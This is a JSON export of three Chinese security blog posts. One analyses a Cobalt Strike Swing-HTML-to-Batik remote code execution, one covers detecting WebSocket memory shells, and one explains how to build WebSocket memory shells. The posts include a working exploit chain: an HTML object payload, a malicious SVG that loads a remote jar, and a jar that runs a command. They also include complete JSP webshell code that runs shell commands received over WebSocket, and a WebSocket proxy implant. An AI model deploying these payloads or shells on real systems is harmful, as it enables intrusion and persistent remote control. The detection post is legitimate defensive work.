{"posts":[{"title":"CoBaltStrike RCE分析","content":"CoBaltStrike RCE分析 前言 看了一下最后用的Apache Batik 组件的加载jar，刚好也分析过CVE-2022-40146就一起看了 CVE-2022-39197 漏洞描述：在 HelpSystems Cobalt Strike 到 4.7 中发现了一个 XSS（跨站点脚本）漏洞，允许远程攻击者在 Cobalt Strike 团队服务器上执行 HTML 从官方的修复及回应中也可以看出这是一个上升至远程代码执行的漏洞：https://www.cobaltstrike.com/blog/out-of-band-update-cobalt-strike-4-7-1/ 而这个XSS是由Swing的html解析器导致的 简单写一个demo import javax.swing.*; public class Test { public static void main(String[] args) { JFrame jFrame = new JFrame(&quot;Test1&quot;); JLabel jLabel = new JLabel(&quot;&lt;html&gt;&lt;h1&gt;6right&lt;/h1&gt;&lt;/html&gt;&quot;); jFrame.add(jLabel); jFrame.setSize(400,500); jFrame.setVisible(true); } } 运行上面的代码片段将创建一个新的JFrame，其中包含一个 使用 HTML 设置标签主体样式的*JLabel 。*在这种情况下，JLabel文本解析了HTML，而JFrame没有。 JLabel JButton JToggleButton JCheckBox JRadioButton JMenu JMenuItem JCheckBoxMenuItem JRadioButtonMenuItem JComboBox JList JTable JTree JToolTip等等 那不是直接使用&lt;script&gt;就好了？ 但是并没有想象的那么简单，在包含scrpt时，并没有执行预期的弹窗，我们下断点看一下 在https://docs.oracle.com/en/java/javase/11/docs/api/java.desktop/javax/swing/text/html/HTMLDocument.HTMLReader.html中可以看到虽然定义了Script applet等标签，但都是还没有支持 但是他支持了标签，可以看下html中object标签的定义：此元素允许您规定插入 HTML 文档中的对象的数据和参数，以及可用来显示和操作数据的代码。 显然是有操作性的，查看OBJECT标签对象的被调用 javax.swing.text.html.HTMLEditorKit.HTMLFactory#create else if (kind == HTML.Tag.OBJECT) { return new ObjectView(elem); 创建了ObjectView对象，查看他的类说明很清晰 &lt;object classid=&quot;javax.swing.JLabel&quot;&gt; &lt;param name=&quot;text&quot; value=&quot;sample text&quot;&gt; &lt;/object&gt; 将尝试加载classid属性指定的类。如果可能，将使用用于加载关联文档的Classloader。这通常与用于加载EditorKit的ClassLoader相同。如果文档的ClassLoader为空，则为Class。使用forName。 如果类能够成功加载，则会尝试通过调用class.newInstance来创建它的实例。将尝试将实例缩小为java.awt类型。组件以显示对象。 也就是可以使用classid指定全类名进行反射加载，但是存在限制条件 看一下javax.swing.text.html.ObjectView#createComponent代码 protected Component createComponent() { AttributeSet attr = getElement().getAttributes(); String classname = (String) attr.getAttribute(HTML.Attribute.CLASSID); try { ReflectUtil.checkPackageAccess(classname); Class c = Class.forName(classname, true,Thread.currentThread(). getContextClassLoader()); Object o = c.newInstance(); if (o instanceof Component) { Component comp = (Component) o; setParameters(comp, attr); return comp; } } catch (Throwable e) { // couldn't create a component... fall through to the // couldn't load representation. } 反射加载全类名，然后初始化指定类示例（这里必须要无参构造方法），再检查初始化是否是Component的实例 是：将返回对象，并调用setParameters 不是：将返回getUnloadableRepresentation的返回值 Component getUnloadableRepresentation() { // PENDING(prinz) get some artwork and return something // interesting here. Component comp = new JLabel(&quot;??&quot;); comp.setForeground(Color.red); return comp; } 在进入到javax.swing.text.html.ObjectView#setParameters private void setParameters(Component comp, AttributeSet attr) { Class k = comp.getClass(); BeanInfo bi; try { bi = Introspector.getBeanInfo(k); } catch (IntrospectionException ex) { System.err.println(&quot;introspector failed, ex: &quot;+ex); return; // quit for now } PropertyDescriptor props[] = bi.getPropertyDescriptors(); for (int i=0; i &lt; props.length; i++) { // System.err.println(&quot;checking on props[i]: &quot;+props[i].getName()); Object v = attr.getAttribute(props[i].getName()); if (v instanceof String) { // found a property parameter String value = (String) v; Method writer = props[i].getWriteMethod(); if (writer == null) { // read-only property. ignore return; // for now } Class[] params = writer.getParameterTypes(); if (params.length != 1) { // zero or more than one argument, ignore return; // for now } Object [] args = { value }; try { MethodUtil.invoke(writer, comp, args); } catch (Exception ex) { System.err.println(&quot;Invocation failed&quot;); // invocation code } } } } 看invoke调用，需要过两个判断 类对象必须存在一个属性存在setter方法(在jlabel中存在setText方法) Method writer = props[i].getWriteMethod(); if (writer == null) { // read-only property. ignore return; // for now } setter方法必须只有一个参数 Class[] params = writer.getParameterTypes(); if (params.length != 1) { // zero or more than one argument, ignore return; // for now } setter方法参数必须是String类型 Object v = attr.getAttribute(props[i].getName()); if (v instanceof String) { // found a property parameter String value = (String) v; xxxx 这里的v是object对象中的value值，而属性名就是object对象的name值 所以总结完利用条件如下： 类必须继承自java.awt.Component 必须有无参构造方法 类对象必须存在一个属性存在setter方法 setter方法的参数必须是一个且为string类型 筛选符合条件结果 这里使用tabby筛选 cypher： match (source:Method {IS_SETTER:true})&lt;-[:HAS]-(cls:Class {HAS_DEFAULT_CONSTRUCTOR: TRUE})-[:INTERFACE|EXTENDS*]-&gt;(cls1:Class {NAME:&quot;java.awt.Component&quot;}) where source.SUB_SIGNATURE =~ &quot;.* set\\w+\\(java.lang.String\\)&quot; return distinct source.SIGNATURE 结果（42个，这里我使用的cs4.3）： 1 &quot;&lt;org.apache.xalan.client.XSLTProcessorApplet: void setDocumentURL(java.lang.String)&gt;&quot; 2 &quot;&lt;org.apache.xalan.client.XSLTProcessorApplet: void setStyleURL(java.lang.String)&gt;&quot; 3 &quot;&lt;java.awt.Frame: void setTitle(java.lang.String)&gt;&quot; 4 &quot;&lt;sun.awt.EmbeddedFrame: void setTitle(java.lang.String)&gt;&quot; 5 &quot;&lt;javax.swing.JComponent: void setToolTipText(java.lang.String)&gt;&quot; 6 &quot;&lt;org.apache.batik.util.gui.UserStyleDialog$Panel: void setPath(java.lang.String)&gt;&quot; 7 &quot;&lt;org.apache.batik.util.gui.LanguageDialog$Panel: void setLanguages(java.lang.String)&gt;&quot; 8 &quot;&lt;console.AssociatedPanel: void setBeaconID(java.lang.String)&gt;&quot; 9 &quot;&lt;console.Console: void setStyle(java.lang.String)&gt;&quot; 10 &quot;&lt;console.Console: void setDefaultPrompt(java.lang.String)&gt;&quot; 11 &quot;&lt;console.Console: void setPrompt(java.lang.String)&gt;&quot; 12 &quot;&lt;org.apache.batik.apps.svgbrowser.StatusBar: void setMessage(java.lang.String)&gt;&quot; 13 &quot;&lt;org.apache.batik.apps.svgbrowser.StatusBar: void setMainMessage(java.lang.String)&gt;&quot; 14 &quot;&lt;console.Display: void setTextDirect(java.lang.String)&gt;&quot; 15 &quot;&lt;console.Display: void setText(java.lang.String)&gt;&quot; 16 &quot;&lt;org.apache.batik.util.gui.LocationBar: void setText(java.lang.String)&gt;&quot; 17 &quot;&lt;org.apache.batik.util.gui.CSSMediaPanel: void setMedia(java.lang.String)&gt;&quot; 18 &quot;&lt;javax.swing.JPopupMenu: void setLabel(java.lang.String)&gt;&quot; 19 &quot;&lt;javax.swing.text.JTextComponent: void setText(java.lang.String)&gt;&quot; 20 &quot;&lt;javax.swing.JTextField: void setActionCommand(java.lang.String)&gt;&quot; 21 &quot;&lt;javax.swing.JEditorPane: void setText(java.lang.String)&gt;&quot; 22 &quot;&lt;javax.swing.JEditorPane: void setCharsetFromContentTypeParameters(java.lang.String)&gt;&quot; 23 &quot;&lt;javax.swing.JEditorPane: void setContentType(java.lang.String)&gt;&quot; 24 &quot;&lt;javax.swing.JEditorPane: void setPage(java.lang.String)&gt;&quot; 25 &quot;&lt;org.apache.batik.util.gui.xmleditor.XMLTextEditor: void setText(java.lang.String)&gt;&quot; 26 &quot;&lt;aggressor.AggressorClient: void setTitle(java.lang.String)&gt;&quot; 27 &quot;&lt;javax.swing.AbstractButton: void setLabel(java.lang.String)&gt;&quot; 28 &quot;&lt;javax.swing.AbstractButton: void setText(java.lang.String)&gt;&quot; 29 &quot;&lt;javax.swing.AbstractButton: void setActionCommand(java.lang.String)&gt;&quot; 30 &quot;&lt;javax.swing.JLabel: void setText(java.lang.String)&gt;&quot; 31 &quot;&lt;org.apache.batik.swing.svg.AbstractJSVGComponent: void setFragmentIdentifier(java.lang.String)&gt;&quot; 32 &quot;&lt;org.apache.batik.swing.JSVGCanvas: void setURI(java.lang.String)&gt;&quot; 33 &quot;&lt;javax.swing.JFileChooser: void setDialogTitle(java.lang.String)&gt;&quot; 34 &quot;&lt;javax.swing.JFileChooser: void setApproveButtonToolTipText(java.lang.String)&gt;&quot; 35 &quot;&lt;javax.swing.JFileChooser: void setApproveButtonText(java.lang.String)&gt;&quot; 36 &quot;&lt;graph.NetworkGraph: void setAutoLayout(java.lang.String)&gt;&quot; 37 &quot;&lt;javax.swing.JToolTip: void setTipText(java.lang.String)&gt;&quot; 38 &quot;&lt;javax.swing.JProgressBar: void setString(java.lang.String)&gt;&quot; 39 &quot;&lt;javax.swing.JInternalFrame: void setTitle(java.lang.String)&gt;&quot; 40 &quot;&lt;javax.swing.JComboBox: void setActionCommand(java.lang.String)&gt;&quot; 41 &quot;&lt;java.awt.TextField: void setText(java.lang.String)&gt;&quot; 42 &quot;&lt;java.awt.Label: void setText(java.lang.String)&gt;&quot; batik远程加载jar 这里对所有符合条件的方法进行筛选也是一个耗时的过程，在已知的情况下我就直接分析&lt;org.apache.batik.swing.JSVGCanvas: void setURI(java.lang.String)&gt;了 已知：batik对SVG对象进行处理时，可以通过xlink:href对jar包进行解析，batik最后是在org.apache.batik.bridge.BaseScriptingEnvironment#loadScript处 if (type.equals(&quot;application/java-archive&quot;)) { try { String href = XLinkSupport.getXLinkHref(script); ParsedURL purl = new ParsedURL(script.getBaseURI(), href); this.checkCompatibleScriptURL(type, purl); URL docURL = null; try { docURL = new URL(this.docPURL.toString()); } catch (MalformedURLException var14) { } DocumentJarClassLoader cll = new DocumentJarClassLoader(new URL(purl.toString()), docURL); URL url = cll.findResource(&quot;META-INF/MANIFEST.MF&quot;); if (url == null) { return; } Manifest man = new Manifest(url.openStream()); this.executedScripts.put(script, (Object)null); mediaType = man.getMainAttributes().getValue(&quot;Script-Handler&quot;); if (mediaType != null) { ScriptHandler h = (ScriptHandler)cll.loadClass(mediaType).getDeclaredConstructor().newInstance(); h.run(this.document, this.getWindow()); } mediaType = man.getMainAttributes().getValue(&quot;SVG-Handler-Class&quot;); if (mediaType != null) { EventListenerInitializer initializer = (EventListenerInitializer)cll.loadClass(mediaType).getDeclaredConstructor().newInstance(); this.getWindow(); initializer.initializeEventListeners((SVGDocument)this.document); } } catch (Exception var16) { if (this.userAgent != null) { this.userAgent.displayError(var16); } } 在cs4.3中是org.apache.batik.bridge.BaseScriptingEnvironment#loadScripts，先打上断点 构造一个恶意svg文件 &lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; xmlns:xlink=&quot;http://www.w3.org/1999/xlink&quot; width=&quot;450&quot; height=&quot;500&quot; viewBox=&quot;0 0 450 500&quot;&gt; &lt;script type=&quot;application/java-archive&quot; xlink:href=&quot;http://192.168.102.19:8081/CVE_2022_40146.jar&quot;&gt;&lt;/script&gt; &lt;/svg&gt; 然后该更JLable值 JLabel jLabel = new JLabel(&quot;&lt;html&gt;&lt;object classid=\\&quot;org.apache.batik.swing.JSVGCanvas\\&quot;&gt;\\n&quot; + &quot; &lt;param name=\\&quot;URI\\&quot; value=\\&quot;http://192.168.102.19:8081/test.svg\\&quot;&gt;\\n&quot; + &quot; &lt;/object&gt;&lt;/html&gt;&quot;); 中间会经过DefaultScriptSecurity，需要svg文件地址和jar包地址host相同，所以放一块就行 jar包类，静态方法恶意即可 import java.io.IOException; public class CVE_2022_40146 { static { try { Runtime.getRuntime().exec(&quot;calc&quot;); } catch (IOException e) { e.printStackTrace(); } } } 打包成jar，修改META-INF/MANIFEST.MF文件，添加条目Script-Handler: CVE_2022_40146 因为在org.apache.batik.bridge.BaseScriptingEnvironment#loadScript做了对MANIFEST条目的校验，得实现Script-Handler或SVG-Handler-Class条目才能进入加载字节码，做到命令执行 CS RCE流程 后续反制可以参考漂亮鼠师傅的 windows api hook https://mp.weixin.qq.com/s/l5e2p_WtYSCYYhYE0lzRdQ 1.将木马文件通过frida运行，用frida脚本 hook Process32Next函数，当木马通过API去获取数据结构中的进程名称(也就是szExeFile)时，得到的是我们脚本传入的恶意html &lt;html&gt;&lt;object classid=&quot;org.apache.batik.swing.JSVGCanvas&quot;&gt;&lt;param name=&quot;URI&quot; value=&quot;http://xxx/test.svg&quot;&gt;&lt;/object&gt;&lt;/html&gt; 2.然后swing解析html去访问加载恶意svg文件 &lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; xmlns:xlink=&quot;http://www.w3.org/1999/xlink&quot; width=&quot;450&quot; height=&quot;500&quot; viewBox=&quot;0 0 450 500&quot;&gt; &lt;script type=&quot;application/java-archive&quot; xlink:href=&quot;http://192.168.102.19:8081/AttackJar.jar&quot;&gt;&lt;/script&gt; &lt;/svg&gt; 3.最后batik解析svg文件去访问加载恶意jar，导致命令执行 参考 https://mp.weixin.qq.com/s/l5e2p_WtYSCYYhYE0lzRdQ ","link":"https://liangyueliangyue.github.io/post/cobaltstrike-rce-fen-xi/"},{"title":"WebSocket内存马检测","content":"检测实现 这里是基于c0ny1师傅的工具：https://github.com/c0ny1/java-memshell-scanner Endpoint信息获取： 从requestContext中获取WsServerContainer容器 通过反射得到configExactMatchMap对象 里面通过Map存储Endpoint键值 public synchronized Map&lt;String,Object&gt; getExactMatch(HttpServletRequest request) throws Exception{ WsServerContainer wsServerContainer = (WsServerContainer) request.getSession().getServletContext().getAttribute(ServerContainer.class.getName()); Class&lt;?&gt; obj = Class.forName(&quot;org.apache.tomcat.websocket.server.WsServerContainer&quot;); Field field = obj.getDeclaredField(&quot;configExactMatchMap&quot;); field.setAccessible(true); Map&lt;String, Object&gt; configExactMatchMap = (Map&lt;String, Object&gt;) field.get(wsServerContainer); return configExactMatchMap; } dump模块：没有改变，直接使用c0ny1的给出类名即可 kill模块： public synchronized void deleteEndpint(HttpServletRequest request,String servletName) throws Exception{ Map&lt;String,Object&gt; ExactMatch = getExactMatch(request); ExactMatch.remove(servletName); } 通过java.util.Map#remove(java.lang.Object)删除容器中的Endpoint接口 注意：这里有一个问题，这里只删除了容器中的Endpint，而注入时requestContext中的路径并没有删除，所以会导致无法向容器注入被删除过的路径。 修改后的源码：https://github.com/liangyueliangyue/java-memshell-scanner 修改后的效果 总结 WebSoket内存马通过分析涉及处理websoket的Endpoint对象，获取请求内容，同时控制响应内容。然后只要模拟对象注册到内存当中过程即可。代理的实现稍微复杂一点，注册的Endpoint对象需要实现与服务端(Endpoint远端)之间的连接与通信 ","link":"https://liangyueliangyue.github.io/post/websocket-nei-cun-ma-jian-ce/"},{"title":"WebSocket内存马","content":"WebSocket WebSocket标准实用性高，使得浏览器和服务器之间任一方都可主动发消息给对方，这样服务器有新数据时可主动推给浏览器。 tomcat Tomcat自7.0.5版本开始支持WebSocket，并且实现了Java WebSocket规范（JSR356 ），而在7.0.5版本之前（7.0.2版本之后）则采用自定义API，即WebSocketServlet。 根据JSR356的规定，Java WebSocket应用由一系列的WebSocket Endpoint组成。Endpoint是一个Java对象，代表WebSocket链接的一端，对于服务端，我们可以视为处理具体WebSocket消息的接口，就像Servlet之于HTTP请求一样（不同之处在于Endpoint每个链接一个实例）。 生命周期 Endpoint实例在WebSocket握手时创建，并在客户端与服务端链接过程中有效，最后在链接关闭时结束。 Endpoint的生命周期方法如下： onOpen：当开启一个新的会话时调用。这是客户端与服务器握手成功后调用的方法。等同于注解@OnOpen。 onClose：当会话关闭时调用。等同于注解@OnClose。 onError：当链接过程中异常时调用。等同于注解@OnError。 消息会话 当客户端链接到一个Endpoint时，服务器端会为其创建一个唯一的会话（javax.websocket.Session）。会话在WebSocket握手之后创建，并在链接关闭时结束。当生命周期中触发各个事件时，都会将当前会话传给Endpoint。 我们通过为Session添加MessageHandler消息处理器来接收消息(很明显，这里请求的回显可以通过MessageHandler和session会话得到)。在这里Session的本质是对Socket的封装，Endpoint通过它与浏览器通信。 定义Endpoint 我们可以通过两种方式定义Endpoint 第一种是编程式，即继承类javax.websocket.Endpoint并实现其方法。 第二种是注解式，即定义一个POJO对象，为其添加Endpoint相关的注解。 WebSocket加载 Tomcat提供了一个javax.servlet.ServletContainerInitializer的实现类org.apache.tomcat.websocket.server.WsSci。因此Tomcat的WebSocket加载是通过SCI机制完成的。 Web应用启动时，通过WsSci.onStartup方法完成WebSocket的初始化： 构造WebSocketContainer实例，Tomcat提供的实现类为WsServerContainer。在WsServerContainer构造方法中，Tomcat除了初始化配置外，还会为ServletContext添加一个过滤器org.apache.tomcat.websocket.server.WsFilter，它用于判断当前请求是否为WebSocket请求，以便完成握手，所以会默认创建(这里veo师傅也提到过)。 可以把WebSocketContainer理解成一个专门处理WebSocket请求的Endpoint容器，他将扫描到的Endpoint子类和添加了注解@ServerEndpoint的类注册到WebSocketContainer上，用于处理WebSocket请求，该容器还维护了URL到Endpoint的映射关系，这样通过请求URL就能找到具体的Endpoint来处理WebSocket请求。 实现类WsServerContainer存在addEndpoint方法来动态注册endpoint端点发布在指定路径（内存马实现关键） WebSocket请求处理 这一块比较复杂且和内存马关系不大，简单讲一下tomcat的实现 因为Tomcat是将HTTP协议升级成WebSocket协议的，所以WebSocket是通过HTTP协议握手的，当WebSocket握手请求到来时，HttpProtocolHandler首先接收到这个请求，在处理这个HTTP请求时，Tomcat通过WsFilter判断该当前HTTP请求是否是一个WebSocket Upgrade请求（即包含Upgrade: websocket的HTTP头信息），如果是，则在HTTP响应里添加WebSocket相关的响应头信息，并进行协议升级。 public void doFilter(ServletRequest request, ServletResponse response, FilterChain chain) throws IOException, ServletException { if (this.sc.areEndpointsRegistered() &amp;&amp; UpgradeUtil.isWebSocketUpgradeRequest(request, response)) { ... WsMappingResult mappingResult = this.sc.findMapping(path); if (mappingResult == null) { chain.doFilter(request, response); } else { UpgradeUtil.doUpgrade(this.sc, req, resp, mappingResult.getConfig(), mappingResult.getPathParams()); } } else { chain.doFilter(request, response); } } 有兴趣可以看看org.apache.tomcat.websocket.server.UpgradeUtil#isWebSocketUpgradeRequest和org.apache.tomcat.websocket.server.UpgradeUtil#doUpgrade的具体实现。 然后用UpgradeProtocolHandler替换当前的HttpProtocolHandler，相应的，把当前Socket的Processor替换成UpgradeProcessor，同时Tomcat会创建WebSocket Session实例和Endpoint实例，并跟当前的WebSocket连接一一对应起来，UpgradeProcessor最终会调用相应的Endpoint实例来处理请求。 内存马实现 首先实现Endpoint类，显然实战中不可能使用注解方式，通过编程式定义 处理ws对象基于类 javax.websocket.server.ServerEndpointConfig.builder，ServerEndpointConfig.Builder 是一个用于创建DefaultServerEndpointConfig对象以部署服务器端点的类 在使用javax.websocket.server.ServerEndpointConfig.Builder#create public static ServerEndpointConfig.Builder create(Class&lt;?&gt; endpointClass, String path) { return new ServerEndpointConfig.Builder(endpointClass, path); } ### private Builder(Class&lt;?&gt; endpointClass, String path) { this.endpointClass = endpointClass; this.path = path; } 配置端点的类和将部署端点的 URI 或 URI 模板(结尾的“/”将被忽略，路径必须以 / 开头) javax.websocket.server.ServerEndpointConfig.Builder#build public ServerEndpointConfig build() { return new DefaultServerEndpointConfig(this.endpointClass, this.path, this.subprotocols, this.extensions, this.encoders, this.decoders, this.configurator); } DefaultServerEndpointConfig是ServerEndpointConfig接口的具体实现类，即使用已在此Builder对象上设置的当前属性构建DefaultServerEndpointConfig对象。 值得一提的是他还存在encoders,decoders,subprotocols,extensions等方法可以自定义编码器，解码器，协议，拓展等功能 现在可以知道，创建一个DefaultServerEndpointConfig对象 DefaultServerEndpointConfig config = ServerEndpointConfig.Builder.create(EndpointInject.class, &quot;/ws&quot;).build(); 得到对象之后构造WebSocketContainer实例，Tomcat提供的实现类为WsServerContainer。 ServerContainer container = (ServerContainer) req.getServletContext().getAttribute(ServerContainer.class.getName()); 然后调用addEndpoint动态添加端口即可 container.addEndpoint(config); 接下来只需要实现Endpoint对象。 可以参考：https://abhishek-gupta.gitbook.io/java-websocket-api-handbook/ 首先，我们要自定义一个消息处理器，实现MessageHandler接口：有两个接口，一个是Partial，另一个是Whole接口，Partial用于接收部分消息，Whole用于一次性接收一条完整的消息。所以我们实现Whole接口 然后重写onMessage和onOpen方法 websocket session发送文本消息有两个方法：getAsyncRemote()和getBasicRemote() ，getAsyncRemote是非阻塞式的，getBasicRemote是阻塞式的，这里使用getBasicRemote获取到RemoteEndpoint 对象的引用，然后javax.websocket.RemoteEndpoint.Basic#sendText(java.lang.String)直接发送 public static class C extends Endpoint implements MessageHandler.Whole&lt;String&gt; { private Session session; @Override public void onMessage(String s) { try { Process process; boolean bool = System.getProperty(&quot;os.name&quot;).toLowerCase().startsWith(&quot;windows&quot;); if (bool) { process = Runtime.getRuntime().exec(new String[] { &quot;cmd.exe&quot;, &quot;/c&quot;, s }); } else { process = Runtime.getRuntime().exec(new String[] { &quot;/bin/bash&quot;, &quot;-c&quot;, s }); } InputStream inputStream = process.getInputStream(); StringBuilder stringBuilder = new StringBuilder(); int i; while ((i = inputStream.read()) != -1) stringBuilder.append((char)i); inputStream.close(); process.waitFor(); session.getBasicRemote().sendText(stringBuilder.toString()); } catch (Exception exception) { exception.printStackTrace(); } } @Override public void onOpen(final Session session, EndpointConfig config) { this.session = session; session.addMessageHandler(this); } } 结果 &lt;%@ page import=&quot;javax.websocket.server.ServerEndpointConfig&quot; %&gt; &lt;%@ page import=&quot;javax.websocket.server.ServerContainer&quot; %&gt; &lt;%@ page import=&quot;javax.websocket.*&quot; %&gt; &lt;%@ page import=&quot;java.io.*&quot; %&gt; &lt;%! public static class C extends Endpoint implements MessageHandler.Whole&lt;String&gt; { private Session session; @Override public void onMessage(String s) { try { Process process; boolean bool = System.getProperty(&quot;os.name&quot;).toLowerCase().startsWith(&quot;windows&quot;); if (bool) { process = Runtime.getRuntime().exec(new String[] { &quot;cmd.exe&quot;, &quot;/c&quot;, s }); } else { process = Runtime.getRuntime().exec(new String[] { &quot;/bin/bash&quot;, &quot;-c&quot;, s }); } InputStream inputStream = process.getInputStream(); StringBuilder stringBuilder = new StringBuilder(); int i; while ((i = inputStream.read()) != -1) stringBuilder.append((char)i); inputStream.close(); process.waitFor(); session.getBasicRemote().sendText(stringBuilder.toString()); } catch (Exception exception) { exception.printStackTrace(); } } @Override public void onOpen(final Session session, EndpointConfig config) { this.session = session; session.addMessageHandler(this); } } %&gt; &lt;% String path = request.getParameter(&quot;path&quot;); ServletContext servletContext = request.getSession().getServletContext(); ServerEndpointConfig configEndpoint = ServerEndpointConfig.Builder.create(C.class, path).build(); ServerContainer container = (ServerContainer) servletContext.getAttribute(ServerContainer.class.getName()); try { if (servletContext.getAttribute(path) == null){ container.addEndpoint(configEndpoint); servletContext.setAttribute(path,path); } out.println(&quot;success, connect url path: &quot; + servletContext.getContextPath() + path); } catch (Exception e) { out.println(e.toString()); } %&gt; 注入：http://localhost:8080/1.jsp?path=/6right ws命令执行：http://www.yunjson.com/websocket/ 代理实现 还是用veo师傅的代码分析 &lt;%@ page import=&quot;javax.websocket.server.ServerEndpointConfig&quot; %&gt; &lt;%@ page import=&quot;javax.websocket.server.ServerContainer&quot; %&gt; &lt;%@ page import=&quot;javax.websocket.*&quot; %&gt; &lt;%@ page import=&quot;java.io.*&quot; %&gt; &lt;%@ page import=&quot;java.nio.channels.AsynchronousSocketChannel&quot; %&gt; &lt;%@ page import=&quot;java.util.HashMap&quot; %&gt; &lt;%@ page import=&quot;java.nio.ByteBuffer&quot; %&gt; &lt;%@ page import=&quot;java.nio.channels.CompletionHandler&quot; %&gt; &lt;%@ page import=&quot;java.net.InetSocketAddress&quot; %&gt; &lt;%@ page import=&quot;java.util.concurrent.TimeUnit&quot; %&gt; &lt;%@ page import=&quot;java.util.concurrent.Future&quot; %&gt; &lt;%! public static class ProxyEndpoint extends Endpoint { long i =0; ByteArrayOutputStream baos = new ByteArrayOutputStream(); HashMap&lt;String,AsynchronousSocketChannel&gt; map = new HashMap&lt;String,AsynchronousSocketChannel&gt;(); static class Attach { public AsynchronousSocketChannel client; public Session channel; } void readFromServer(Session channel,AsynchronousSocketChannel client){ final ByteBuffer buffer = ByteBuffer.allocate(50000); Attach attach = new Attach(); attach.client = client; attach.channel = channel; client.read(buffer, attach, new CompletionHandler&lt;Integer, Attach&gt;() { @Override public void completed(Integer result, final Attach scAttachment) { buffer.clear(); try { if(buffer.hasRemaining() &amp;&amp; result&gt;=0) { byte[] arr = new byte[result]; ByteBuffer b = buffer.get(arr,0,result); baos.write(arr,0,result); ByteBuffer q = ByteBuffer.wrap(baos.toByteArray()); if (scAttachment.channel.isOpen()) { scAttachment.channel.getBasicRemote().sendBinary(q); } baos = new ByteArrayOutputStream(); readFromServer(scAttachment.channel,scAttachment.client); }else{ if(result &gt; 0) { byte[] arr = new byte[result]; ByteBuffer b = buffer.get(arr,0,result); baos.write(arr,0,result); readFromServer(scAttachment.channel,scAttachment.client); } } } catch (Exception ignored) {} } @Override public void failed(Throwable t, Attach scAttachment) {t.printStackTrace();} }); } void process(ByteBuffer z,Session channel) { try{ if(i&gt;1) { AsynchronousSocketChannel client = map.get(channel.getId()); client.write(z).get(); z.flip(); z.clear(); } else if(i==1) { String values = new String(z.array()); String[] array = values.split(&quot; &quot;); String[] addrarray = array[1].split(&quot;:&quot;); AsynchronousSocketChannel client = AsynchronousSocketChannel.open(); int po = Integer.parseInt(addrarray[1]); InetSocketAddress hostAddress = new InetSocketAddress(addrarray[0], po); Future&lt;Void&gt; future = client.connect(hostAddress); try { future.get(10, TimeUnit.SECONDS); } catch(Exception ignored){ channel.getBasicRemote().sendText(&quot;HTTP/1.1 503 Service Unavailable\\r\\n\\r\\n&quot;); return; } map.put(channel.getId(), client); readFromServer(channel,client); channel.getBasicRemote().sendText(&quot;HTTP/1.1 200 Connection Established\\r\\n\\r\\n&quot;); } }catch(Exception ignored){ } } @Override public void onOpen(final Session session, EndpointConfig config) { i=0; session.setMaxBinaryMessageBufferSize(1024*1024*20); session.setMaxTextMessageBufferSize(1024*1024*20); session.addMessageHandler(new MessageHandler.Whole&lt;ByteBuffer&gt;() { @Override public void onMessage(ByteBuffer message) { try { message.clear(); i++; process(message,session); } catch (Exception ignored) { } } }); } } %&gt; &lt;% String path = request.getParameter(&quot;path&quot;); ServletContext servletContext = request.getSession().getServletContext(); ServerEndpointConfig configEndpoint = ServerEndpointConfig.Builder.create(ProxyEndpoint.class, path).build(); ServerContainer container = (ServerContainer) servletContext.getAttribute(ServerContainer.class.getName()); try { if (servletContext.getAttribute(path) == null){ container.addEndpoint(configEndpoint); servletContext.setAttribute(path,path); } out.println(&quot;success, connect url path: &quot; + servletContext.getContextPath() + path); } catch (Exception e) { out.println(e.toString()); } %&gt; 首先还是正常的添加Endpoint，直接看重写的onOpen public void onOpen(final Session session, EndpointConfig config) { i=0; session.setMaxBinaryMessageBufferSize(1024*1024*20); session.setMaxTextMessageBufferSize(1024*1024*20); session.addMessageHandler(new MessageHandler.Whole&lt;ByteBuffer&gt;() { @Override public void onMessage(ByteBuffer message) { try { message.clear(); i++; process(message,session); } catch (Exception ignored) { } } }); } 设置了会话的传输大小限制，然后new了一个MessageHandler.Whole()接口(ProxyEndpoint 没有实现) 重写onMessage方法，接收ByteBuffer(负责承载通信过程中需要读写的消息)，先清空buffer然后调用process函数 Socket通道连接服务端 void process(ByteBuffer z,Session channel) { try{ if(i&gt;1) { AsynchronousSocketChannel client = map.get(channel.getId()); client.write(z).get(); z.flip(); z.clear(); } else if(i==1) { String values = new String(z.array()); String[] array = values.split(&quot; &quot;); String[] addrarray = array[1].split(&quot;:&quot;); AsynchronousSocketChannel client = AsynchronousSocketChannel.open(); int po = Integer.parseInt(addrarray[1]); InetSocketAddress hostAddress = new InetSocketAddress(addrarray[0], po); Future&lt;Void&gt; future = client.connect(hostAddress); try { future.get(10, TimeUnit.SECONDS); } catch(Exception ignored){ channel.getBasicRemote().sendText(&quot;HTTP/1.1 503 Service Unavailable\\r\\n\\r\\n&quot;); return; } map.put(channel.getId(), client); readFromServer(channel,client); channel.getBasicRemote().sendText(&quot;HTTP/1.1 200 Connection Established\\r\\n\\r\\n&quot;); } }catch(Exception ignored){ } } 如果i是1则建立Socket连接，如果&gt;1说明连接已经建立过，直接获取通道，然后调用wirte函数向通道写入字节(然后等readFromServer异步读取即可) 先通过前面获取的buffer得到client hostAddress，然后通过AsynchronousSocketChannel.open()创建和打开一个实例然后再调用其connect()方法连接到服务端， Future 对象是将当前线程阻塞来等待结果 将session的id和对应的client管道放到map(不会重复创建)，然后调用readFromServer函数 服务端交互 void readFromServer(Session channel,AsynchronousSocketChannel client){ final ByteBuffer buffer = ByteBuffer.allocate(50000); Attach attach = new Attach(); attach.client = client; attach.channel = channel; client.read(buffer, attach, new CompletionHandler&lt;Integer, Attach&gt;() { @Override public void completed(Integer result, final Attach scAttachment) { buffer.clear(); try { if(buffer.hasRemaining() &amp;&amp; result&gt;=0) { byte[] arr = new byte[result]; ByteBuffer b = buffer.get(arr,0,result); baos.write(arr,0,result); ByteBuffer q = ByteBuffer.wrap(baos.toByteArray()); if (scAttachment.channel.isOpen()) { scAttachment.channel.getBasicRemote().sendBinary(q); } baos = new ByteArrayOutputStream(); readFromServer(scAttachment.channel,scAttachment.client); }else{ if(result &gt; 0) { byte[] arr = new byte[result]; ByteBuffer b = buffer.get(arr,0,result); baos.write(arr,0,result); readFromServer(scAttachment.channel,scAttachment.client); } } } catch (Exception ignored) {} } @Override public void failed(Throwable t, Attach scAttachment) {t.printStackTrace();} }); } allocate分配缓冲区，构建一个指定接收长度的ByteBuffer用于接收数据，然后调用socketChannel.read()方法读取消息并通过CompletionHandler处理读取结果 CompletionHandler是消息处理回调接口，一个负责消费异步IO操作结果的消息处理器 此包中定义的异步通道允许指定完成处理程序以使用异步操作的结果。 completed：当 I/O 